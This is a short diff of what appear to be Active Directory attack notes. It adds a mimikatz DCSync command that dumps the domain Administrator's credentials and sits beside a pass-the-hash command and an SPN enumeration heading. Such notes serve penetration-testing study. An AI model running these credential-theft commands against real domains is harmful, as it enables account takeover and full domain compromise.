@@ -45,10 +45,13 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /rc4:<NTLM hash> /
 # /run:<Command>: For example /run:cmd.exe
 # 2. After that, we canuse cmd.exe to execute commands in the user's context. 
 
+# Run a dcsync attack:
+.\mimikatz.exe privilege::debug "lsadump::dcsync
+/domain:$domain /user:Administrator" exit
 ```
 
-## An Example
 
+## An Example
 
 **1.** Enumerating SPNs with setspn.exe
 
